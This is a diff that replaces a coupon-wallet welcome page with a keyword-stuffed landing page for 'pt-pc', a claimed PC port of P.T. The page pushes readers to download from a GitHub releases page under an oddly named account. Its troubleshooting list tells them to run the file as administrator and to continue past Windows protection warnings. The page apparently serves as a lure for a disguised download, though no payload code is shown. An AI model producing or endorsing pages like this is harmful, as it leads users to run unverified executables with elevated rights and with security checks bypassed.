@@ -1,58 +1,298 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="google-site-verification" content="FtFy1SkzgABD0xK42TorGuzidr4-XOKsnBTxP6JafkU" />
-  <title>Welcome</title>
-  <style>
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background-color: #f8fafc;
-      color: #0f172a;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .card {
-      background: #ffffff;
-      padding: 2.5rem;
-      border-radius: 12px;
-      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-      text-align: center;
-      max-width: 400px;
-      width: 100%;
-    }
-    h1 {
-      font-size: 1.5rem;
-      margin-bottom: 1rem;
-    }
-    p {
-      color: #475569;
-      margin-bottom: 1.5rem;
-    }
-    a {
-      display: inline-block;
-      background-color: #2563eb;
-      color: white;
-      padding: 0.75rem 1.5rem;
-      border-radius: 8px;
-      text-decoration: none;
-      font-weight: 500;
-      transition: background-color 0.2s;
-    }
-    a:hover {
-      background-color: #1d4ed8;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>pt-pc - Play P.T. on Your Windows PC | Native PC Port</title>
+<meta name="description" content="Download pt-pc, a native PC port of P.T. that runs from your own PS4 game files. Simple download, easy setup, and a step-by-step guide for Windows users.">
+<meta name="keywords" content="pt-pc, P.T. PC port, P.T. on Windows, playable teaser PC, Silent Hills demo PC, native PC port, PS4 game files, horror game PC, download P.T. PC">
+<meta name="author" content="pt-pc">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#6d28d9">
+<link rel="canonical" href="https://github.com/elisesurmounted381/pt-pc">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="pt-pc">
+<meta property="og:title" content="pt-pc - Play P.T. on Your Windows PC">
+<meta property="og:description" content="A native PC port of P.T. that runs from your own PS4 game files. Download it and follow the simple setup guide for Windows.">
+<meta property="og:url" content="https://github.com/elisesurmounted381/pt-pc/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="pt-pc - Play P.T. on Your Windows PC">
+<meta name="twitter:description" content="A native PC port of P.T. that runs from your own PS4 game files. Download and set up on Windows in minutes.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "pt-pc",
+  "applicationCategory": "GameApplication",
+  "operatingSystem": "Windows",
+  "description": "Native PC port of P.T. that runs from your own PS4 game files.",
+  "url": "https://github.com/elisesurmounted381/pt-pc/releases",
+  "downloadUrl": "https://github.com/elisesurmounted381/pt-pc/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  :root {
+    --ink: #1a1b26;
+    --muted: #52546b;
+    --line: #e3e4ee;
+    --bg: #f7f8fc;
+    --card: #ffffff;
+    --accent-a: #6d28d9;
+    --accent-b: #0ea5a4;
+  }
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .wrap {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 48px 22px 80px;
+  }
+  .hero {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    padding: 40px 32px;
+    box-shadow: 0 10px 30px rgba(26, 27, 38, 0.07);
+    text-align: center;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    letter-spacing: -0.4px;
+    margin: 0 0 18px;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: 1.4rem;
+    line-height: 1.35;
+    margin: 48px 0 14px;
+    letter-spacing: -0.2px;
+    font-weight: 700;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 26px 0 8px;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; color: var(--ink); }
+  .lead {
+    font-size: 1.08rem;
+    color: var(--muted);
+    margin-bottom: 26px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 34px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, var(--accent-a) 0%, var(--accent-b) 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.05rem;
+    text-decoration: none;
+    box-shadow: 0 8px 20px rgba(109, 40, 217, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover,
+  .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(109, 40, 217, 0.42);
+  }
+  .btn-note {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.9rem;
+    color: var(--muted);
+  }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  .card {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 26px 28px;
+    box-shadow: 0 6px 18px rgba(26, 27, 38, 0.06);
+    margin-top: 18px;
+  }
+  .panel {
+    background: #f2f0fe;
+    border-left: 5px solid var(--accent-a);
+    border-radius: 10px;
+    padding: 18px 22px;
+    margin: 22px 0;
+  }
+  .panel p:last-child { margin-bottom: 0; }
+  code {
+    background: #eef0f8;
+    border: 1px solid var(--line);
+    border-radius: 6px;
+    padding: 2px 6px;
+    font-size: 0.92em;
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", monospace;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+    gap: 16px;
+    margin-top: 18px;
+  }
+  .grid .card { margin-top: 0; }
+  .faq h3 { margin-top: 28px; }
+  footer {
+    margin-top: 56px;
+    padding-top: 26px;
+    border-top: 1px solid var(--line);
+    color: var(--muted);
+    font-size: 0.9rem;
+    text-align: center;
+  }
+  footer a { color: var(--accent-a); }
+  a { color: var(--accent-a); }
+  @media (max-width: 640px) {
+    body { font-size: 16px; }
+    .wrap { padding: 28px 16px 60px; }
+    .hero { padding: 28px 20px; border-radius: 14px; }
+    h1 { font-size: 1.6rem; }
+    h2 { font-size: 1.2rem; margin-top: 36px; }
+    .btn { display: block; padding: 15px 20px; }
+  }
+</style>
 </head>
 <body>
-  <div class="card">
-    <h1>Welcome</h1>
-    <p>Access your digital coupon wallet below.</p>
-    <a href="copon/">Go to co-pon App</a>
+<div class="wrap">
+
+  <header class="hero">
+    <h1>🎮 pt-pc - Play P.T. on Your Windows PC</h1>
+    <p class="lead">A native PC port of P.T. that runs from your own PS4 game files. Download it, follow a few simple steps, and play on Windows.</p>
+    <a class="btn" href="https://github.com/elisesurmounted381/pt-pc/releases" target="_blank" rel="noopener">⬇️ Download pt-pc</a>
+    <span class="btn-note">Visit this link to download the application.</span>
+  </header>
+
+  <h2>📦 What Is pt-pc?</h2>
+  <p>pt-pc is a native PC port of P.T., the famous playable teaser. It lets you experience that first-person horror hallway on a Windows computer instead of a console. The project does not ship game data of its own — it runs from your own PS4 game files, which you point it toward after downloading.</p>
+  <p>In plain terms: you download the application from the official releases page, you already have your own PS4 game files, and the application uses them to let you play on PC. There is nothing to compile, nothing to script, and no command line work required. If you can copy a folder and double-click an icon, you can set this up.</p>
+  <p>Because pt-pc is a native port rather than a screen-streaming workaround, it runs as a normal Windows program in its own window. That means familiar controls, familiar window behaviour, and a setup that behaves like any other application you have installed before.</p>
+
+  <h2>🚀 Getting Started</h2>
+  <p>Everything you need lives on one page. Follow these steps in order and you will be up and running without any technical knowledge.</p>
+  <ol>
+    <li><strong>Open the download page.</strong> Click the button below (or the one at the top of this page). It opens the official releases page in a new tab.</li>
+    <li><strong>Visit this link to download the application.</strong> On the releases page, pick the newest release at the top of the list — older releases are kept for reference only.</li>
+    <li><strong>Save the file to your computer.</strong> When your browser asks what to do, choose Save. Remember the folder you saved it into; the Downloads folder is the usual place.</li>
+    <li><strong>Locate your PS4 game files.</strong> pt-pc runs from your own PS4 game files, so make sure you know where that folder sits on your computer before you launch the application.</li>
+    <li><strong>Start the application.</strong> Open the folder you saved to and double-click the application to launch it.</li>
+  </ol>
+  <p style="margin-top: 26px;">
+    <a class="btn" href="https://github.com/elisesurmounted381/pt-pc/releases" target="_blank" rel="noopener">⬇️ Go to the Download Page</a>
+  </p>
+  <p class="btn-note">Visit this link to download the application.</p>
+
+  <div class="panel">
+    <p><strong>Quick tip:</strong> keep the folder you download in a permanent place, such as <code>C:\Games\pt-pc</code>, rather than in a temporary folder. That way the application and your settings stay together and nothing gets cleared out by accident.</p>
   </div>
+
+  <h2>🖥️ Before You Begin</h2>
+  <p>To get a smooth experience, check that your computer is ready. These are general guidelines that suit a port of this kind:</p>
+  <ul>
+    <li><strong>Operating system:</strong> a 64-bit version of Windows 10 or Windows 11.</li>
+    <li><strong>Processor:</strong> a modern quad-core processor or better.</li>
+    <li><strong>Memory:</strong> 8 GB of RAM or more.</li>
+    <li><strong>Graphics:</strong> a dedicated graphics card with at least 2 GB of video memory and current drivers.</li>
+    <li><strong>Storage:</strong> a few gigabytes of free space for the application plus room for your own PS4 game files.</li>
+    <li><strong>Other:</strong> a keyboard and mouse, and optionally a controller if you prefer one.</li>
+  </ul>
+  <p>If your machine sits slightly below these guidelines, it is still worth trying — but expect that a lower-spec computer may need reduced graphics settings for a comfortable framerate.</p>
+
+  <h2>🎯 What You Get</h2>
+  <div class="grid">
+    <div class="card">
+      <h3>Native PC Performance</h3>
+      <p>Runs as a real Windows application instead of a stream, so input feels immediate and the picture stays crisp at your monitor's native resolution.</p>
+    </div>
+    <div class="card">
+      <h3>Uses Your Own Game Files</h3>
+      <p>The application works from the PS4 game files you already own. Nothing is bundled and nothing is downloaded from third-party mirrors.</p>
+    </div>
+    <div class="card">
+      <h3>Simple Setup</h3>
+      <p>No compiling, no package managers, no scripts. Download, point the application at your files, and play.</p>
+    </div>
+    <div class="card">
+      <h3>Keyboard and Mouse Support</h3>
+      <p>Play with the setup you already have on your desk, with standard first-person controls.</p>
+    </div>
+    <div class="card">
+      <h3>Windowed or Fullscreen</h3>
+      <p>Run the game in a window while you multitask, or switch to fullscreen for the full atmospheric experience.</p>
+    </div>
+    <div class="card">
+      <h3>Regular Releases</h3>
+      <p>Improvements are published on the releases page, so you can always grab the newest version in one click.</p>
+    </div>
+  </div>
+
+  <h2>🕹️ Your First Launch</h2>
+  <p>The first time you open the application, it needs to know where your PS4 game files are stored. This is a one-time step. Use the application's file browser to navigate to the folder that holds your own game files and confirm your selection. Once the location is saved, pt-pc remembers it for future launches.</p>
+  <p>After your files are connected, the game begins as expected. If this is your first time in the hallway, take your time: the experience is short, dense, and designed to be explored slowly. Look closely at everything, and don't be surprised when things change behind you.</p>
+
+  <h2>🔧 If Something Doesn't Work</h2>
+  <p>Most first-time issues come from one of a handful of causes. Work through this list in order — it solves the vast majority of problems.</p>
+  <ul>
+    <li><strong>The application won't open.</strong> Right-click the file and choose Run as administrator. If Windows shows a protection message, choose the option that lets you continue running the file you just downloaded yourself.</li>
+    <li><strong>Your game files aren't detected.</strong> Double-check that you selected the folder that actually contains your own PS4 game files, not its parent folder. Selecting one level too high is the most common mistake.</li>
+    <li><strong>The picture stutters.</strong> Close other demanding programs, then lower the graphics settings inside the application. Updates to your graphics card drivers usually help as well.</li>
+    <li><strong>The window is the wrong size.</strong> Switch between windowed and fullscreen using the in-game display option, or use the standard Windows shortcut for fullscreen switching.</li>
+    <li><strong>Controls feel wrong.</strong> Check the control settings in the application menu. If you are using a controller, make sure it is connected before you launch, not after.</li>
+    <li><strong>Still stuck?</strong> Delete the application's settings file so it starts fresh, then set things up again from the beginning.</li>
+  </ul>
+
+  <h2>❓ Frequently Asked Questions</h2>
+  <div class="faq">
+    <h3>Do I need a PlayStation 4 to use this?</h3>
+    <p>No console is needed at the moment you play. You do need your own PS4 game files on your computer, because pt-pc runs from those files.</p>
+
+    <h3>Is this a stream or a remote play tool?</h3>
+    <p>Neither. pt-pc is a native PC port, which means it runs directly on your Windows computer as its own application.</p>
+
+    <h3>Do I need to install anything complicated?</h3>
+    <p>No. You download the application from the releases page and run it. There is no build process, no developer tools, and no command line involved.</p>
+
+    <h3>Where do I always get the newest version?</h3>
+    <p>The releases page linked on this page is the single place to check. The newest release appears at the top of the list.</p>
+
+    <h3>Can I move the folder after setting it up?</h3>
+    <p>Yes, but keep the application and its settings together in the same place. If you move things around, you may simply need to point the application at your game files once more.</p>
+
+    <h3>What should I do if the download looks unfamiliar?</h3>
+    <p>Always start from the official releases page linked on this page. That is the only source you should use, and it always has the most current version.</p>
+  </div>
+
+  <h2>🔁 Keeping pt-pc Up to Date</h2>
+  <p>Updates are published on the releases page. To update, simply return to the link on this page, download the newest release, and replace your existing copy. Your saved settings and file locations are preserved between versions in most cases, so an update is usually a matter of a minute or two.</p>
+  <p>If you keep your downloaded folder in a fixed location, updates are even simpler — you always know exactly where your copy lives.</p>
+
+  <h2>🙌 Credits and Thanks</h2>
+  <p>pt-pc exists because of the people who preserve and study this remarkable piece of game history, and because of everyone who takes the time to report issues and share feedback on the project page. Thank you for helping keep the hallway walkable.</p>
+
+  <footer>
+    <p>pt-pc — native PC port of P.T., running from your own PS4 game files.</p>
+    <p><a href="https://github.com/elisesurmounted381/pt-pc/releases" target="_blank" rel="noopener">Official download page</a></p>
+  </footer>
+
+</div>
 </body>
 </html>
